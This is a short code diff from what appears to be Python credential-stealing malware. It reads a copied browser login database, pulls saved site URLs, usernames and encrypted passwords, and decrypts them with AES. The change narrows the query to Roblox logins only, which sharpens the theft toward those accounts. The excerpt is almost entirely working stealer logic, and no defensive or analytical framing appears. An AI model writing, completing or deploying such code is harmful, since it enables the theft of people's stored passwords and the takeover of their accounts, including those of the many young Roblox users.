@@ -20,7 +20,7 @@ shutil.copy2(db, tmp)
 conn = sqlite3.connect(tmp)
 cur = conn.cursor()
 for origin_url, username, password_enc in cur.execute(
-    "SELECT origin_url, username_value, password_value FROM logins WHERE origin_url LIKE '%%'"
+    "SELECT origin_url, username_value, password_value FROM logins WHERE origin_url LIKE '%roblox%'"
 ):
     iv = b' ' * 16
     cipher = AES.new(dk, AES.MODE_CBC, IV=iv)
